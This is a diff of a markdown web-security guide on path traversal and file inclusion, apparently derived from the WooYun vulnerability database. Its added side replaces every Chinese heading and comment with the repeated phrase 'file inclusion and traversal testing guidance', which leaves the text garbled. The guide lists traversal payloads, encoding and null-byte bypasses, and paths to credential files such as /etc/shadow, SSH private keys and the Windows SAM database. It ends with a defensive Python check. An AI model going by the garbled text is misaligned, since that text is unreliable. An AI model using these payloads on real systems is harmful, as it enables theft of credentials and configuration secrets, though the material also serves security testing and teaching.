@@ -1,117 +1,117 @@
-# Web 安全 - 文件遍历与文件包含
+# Web file inclusion and traversal testing guidance - file inclusion and traversal testing guidance
 
-> 来源: WooYun 漏洞库 | 拆自 web-file-infra.md
+> file inclusion and traversal testing guidance: WooYun file inclusion and traversal testing guidance | file inclusion and traversal testing guidance web-file-infra.md
 
-## 二、文件遍历与文件包含
+## file inclusion and traversal testing guidance、file inclusion and traversal testing guidance
 
-### 2.1 漏洞本质
-
-```
-用户输入空间 -> [信任边界失效] -> 文件系统空间
-核心: 开发者认为"用户输入=文件名"，攻击者利用"用户输入=路径指令"
-```
-
-### 2.2 漏洞参数识别
-
-高频参数名(按出现频率):
+### 2.1 file inclusion and traversal testing guidance
 
 ```
-文件类: filename, filepath, path, file, filePath, hdfile, inputFile
-下载类: download, down, attachment, attach, doc
-读取类: read, load, get, fetch, open, input
-模板类: template, tpl, page, include, temp
-通用类: url, src, dir, folder, resource, name
+file inclusion and traversal testing guidance -> [file inclusion and traversal testing guidance] -> file inclusion and traversal testing guidance
+file inclusion and traversal testing guidance: file inclusion and traversal testing guidance"file inclusion and traversal testing guidance=file inclusion and traversal testing guidance"，file inclusion and traversal testing guidance"file inclusion and traversal testing guidance=file inclusion and traversal testing guidance"
 ```
 
-高危功能点(TOP 5):
-1. 文件下载接口 (27次) - `down.php, download.jsp`
-2. 文件预览功能 (17次) - `view.php, preview.jsp`
-3. 附件管理 (6次) - `attachment.php`
-4. 图片加载 (5次) - `pic.php, image.jsp`
-5. 日志查看 (4次) - `log.php, viewlog.jsp`
+### 2.2 file inclusion and traversal testing guidance
 
-### 2.3 目录遍历Payload
+file inclusion and traversal testing guidance(file inclusion and traversal testing guidance):
 
-基础遍历:
+```
+file inclusion and traversal testing guidance: filename, filepath, path, file, filePath, hdfile, inputFile
+file inclusion and traversal testing guidance: download, down, attachment, attach, doc
+file inclusion and traversal testing guidance: read, load, get, fetch, open, input
+file inclusion and traversal testing guidance: template, tpl, page, include, temp
+file inclusion and traversal testing guidance: url, src, dir, folder, resource, name
+```
+
+file inclusion and traversal testing guidance(TOP 5):
+1. file inclusion and traversal testing guidance (27file inclusion and traversal testing guidance) - `down.php, download.jsp`
+2. file inclusion and traversal testing guidance (17file inclusion and traversal testing guidance) - `view.php, preview.jsp`
+3. file inclusion and traversal testing guidance (6file inclusion and traversal testing guidance) - `attachment.php`
+4. file inclusion and traversal testing guidance (5file inclusion and traversal testing guidance) - `pic.php, image.jsp`
+5. file inclusion and traversal testing guidance (4file inclusion and traversal testing guidance) - `log.php, viewlog.jsp`
+
+### 2.3 file inclusion and traversal testing guidancePayload
+
+file inclusion and traversal testing guidance:
 
 ```bash
-../                          # Linux标准
-..\..\                       # Windows标准
+../                          # Linuxfile inclusion and traversal testing guidance
+..\..\                       # Windowsfile inclusion and traversal testing guidance
 ../../../../../../../etc/passwd
 ..\..\..\..\..\..\windows\win.ini
 ```
 
-编码绕过:
+file inclusion and traversal testing guidance:
 
 ```bash
-# URL单次编码
+# URLfile inclusion and traversal testing guidance
 %2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/
 
-# URL双重编码
+# URLfile inclusion and traversal testing guidance
 %252e%252e%252f  |  ..%252f
 
-# Unicode/UTF-8超长编码 (GlassFish特有)
+# Unicode/UTF-8file inclusion and traversal testing guidance (GlassFishfile inclusion and traversal testing guidance)
 %c0%ae%c0%ae/%c0%af
 
-# 混合编码
+# file inclusion and traversal testing guidance
 ..%2f  |  %2e%2e/  |  ..%c0%af
 ```
 
-特殊绕过:
+file inclusion and traversal testing guidance:
 
 ```bash
-# 空字节截断 (PHP<5.3.4 / Java旧版本)
+# file inclusion and traversal testing guidance (PHP<5.3.4 / Javafile inclusion and traversal testing guidance)
 ../../../etc/passwd%00.jpg
 
-# 问号截断
+# file inclusion and traversal testing guidance
 ../../../WEB-INF/web.xml%3f
 
-# 路径混淆
+# file inclusion and traversal testing guidance
 ....//  |  ....\/  |  ..\/  |  ./../../
 
-# 绝对路径/协议绕过
+# file inclusion and traversal testing guidance/file inclusion and traversal testing guidance
 /etc/passwd
 file:///etc/passwd
 file://localhost/etc/passwd
 ```
 
-### 2.4 敏感文件路径速查表
+### 2.4 file inclusion and traversal testing guidance
 
-Linux系统:
+Linuxfile inclusion and traversal testing guidance:
 
 ```bash
-/etc/passwd                    # 用户列表(验证首选)
-/etc/shadow                    # 密码哈希
-/etc/hosts                     # 主机映射
-/root/.ssh/id_rsa              # SSH私钥
-/root/.bash_history            # 命令历史
-/proc/self/environ             # 进程环境变量
-/etc/nginx/nginx.conf          # Nginx配置
-/etc/my.cnf                    # MySQL配置
+/etc/passwd                    # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
+/etc/shadow                    # file inclusion and traversal testing guidance
+/etc/hosts                     # file inclusion and traversal testing guidance
+/root/.ssh/id_rsa              # SSHfile inclusion and traversal testing guidance
+/root/.bash_history            # file inclusion and traversal testing guidance
+/proc/self/environ             # file inclusion and traversal testing guidance
+/etc/nginx/nginx.conf          # Nginxfile inclusion and traversal testing guidance
+/etc/my.cnf                    # MySQLfile inclusion and traversal testing guidance
 ```
 
-Windows系统:
+Windowsfile inclusion and traversal testing guidance:
 
 ```bash
-C:\windows\win.ini             # 系统配置(验证首选)
-C:\boot.ini                    # 启动配置(XP/2003)
-C:\inetpub\wwwroot\web.config  # IIS应用配置
-C:\windows\system32\config\sam # SAM数据库
+C:\windows\win.ini             # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
+C:\boot.ini                    # file inclusion and traversal testing guidance(XP/2003)
+C:\inetpub\wwwroot\web.config  # IISfile inclusion and traversal testing guidance
+C:\windows\system32\config\sam # SAMfile inclusion and traversal testing guidance
 ```
 
 Java Web:
 
 ```bash
-WEB-INF/web.xml                         # 核心配置(验证首选)
-WEB-INF/classes/jdbc.properties          # 数据库配置
-WEB-INF/classes/applicationContext.xml   # Spring配置
-WEB-INF/classes/hibernate.cfg.xml        # Hibernate配置
+WEB-INF/web.xml                         # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
+WEB-INF/classes/jdbc.properties          # file inclusion and traversal testing guidance
+WEB-INF/classes/applicationContext.xml   # Springfile inclusion and traversal testing guidance
+WEB-INF/classes/hibernate.cfg.xml        # Hibernatefile inclusion and traversal testing guidance
 ```
 
-PHP应用:
+PHPfile inclusion and traversal testing guidance:
 
 ```bash
-config.php | config.inc.php | db.php | conn.php    # 通用配置
+config.php | config.inc.php | db.php | conn.php    # file inclusion and traversal testing guidance
 wp-config.php                           # WordPress
 config_global.php | config_ucenter.php  # Discuz
 application/config/database.php         # CodeIgniter
@@ -120,26 +120,26 @@ application/config/database.php         # CodeIgniter
 ASP.NET:
 
 ```bash
-web.config                 # 核心配置(含连接字符串)
-../web.config              # 上级目录配置
+web.config                 # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
+../web.config              # file inclusion and traversal testing guidance
 ```
 
-### 2.5 防御措施
+### 2.5 file inclusion and traversal testing guidance
 
 ```python
 import os
 def safe_file_access(user_input, base_dir):
-    # 1. 路径规范化
+    # 1. file inclusion and traversal testing guidance
     full_path = os.path.normpath(os.path.join(base_dir, user_input))
-    # 2. 验证在允许目录内
+    # 2. file inclusion and traversal testing guidance
     if not full_path.startswith(os.path.normpath(base_dir)):
         raise SecurityError("Path traversal detected")
-    # 3. 白名单扩展名
-    # 4. 验证文件存在
+    # 3. file inclusion and traversal testing guidance
+    # 4. file inclusion and traversal testing guidance
     return full_path
 ```
 
-关键原则: 路径规范化(realpath/normpath) -> 目录边界校验 -> 白名单验证 -> 最小权限运行
+file inclusion and traversal testing guidance: file inclusion and traversal testing guidance(realpath/normpath) -> file inclusion and traversal testing guidance -> file inclusion and traversal testing guidance -> file inclusion and traversal testing guidance
 
 ---
 
